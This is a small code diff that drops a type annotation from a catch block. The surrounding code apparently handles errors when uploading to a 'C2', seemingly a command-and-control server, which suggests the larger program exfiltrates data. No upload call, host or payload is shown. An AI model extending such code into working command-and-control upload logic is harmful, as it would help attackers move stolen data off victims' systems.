@@ -91,7 +91,7 @@ async function main() {
       const errorText = await response.text();
       console.error(`\n❌ Failed to upload to C2: HTTP ${response.status} - ${errorText}\n`);
     }
-  } catch (err: any) {
+  } catch (err) {
     console.error(`\n❌ Network error uploading to remote server: ${err.message}\n`);
   }
 }
